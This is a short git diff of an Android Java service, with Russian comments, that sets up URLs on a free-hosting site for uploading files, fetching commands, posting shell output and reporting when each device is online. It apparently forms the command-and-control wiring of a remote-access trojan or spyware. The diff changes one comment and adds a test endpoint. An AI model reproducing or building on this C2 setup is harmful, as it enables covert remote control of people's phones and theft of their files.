@@ -57,7 +57,7 @@ public class MyService extends Service {
 
     public final static String LOG_TAG = "myLogs";
     static String log_path;//полный путь до папки logs
-    //mywebsutedlatest.000webhostapp.com http://www.test1.ru/
+    //ссылка на сайт
     final static String site = "http://mywebsutedlatest.000webhostapp.com";
     final static String Devices = site+"/Devices/"+DeviceID()+"/";
 
@@ -65,6 +65,7 @@ public class MyService extends Service {
     final static String uploader_url = Devices +"up.php";//для загрузки файлов на сервер
     final static String cmd_url = Devices +"getc.php";//возращает команду из файла c.txt
     public final static String post_url = Devices +"output.php";//файл output или же status
+    public final static String test_url = Devices +"tests.php";//файл test
     final static String online_url = Devices +"online.php";//сообщает о онлайне
     final static String shelltime_url = Devices +"time.php";//время использования комманды на сервере
     final static String CheckDevice = site +"CheckDevice.php";//время использования комманды на сервере
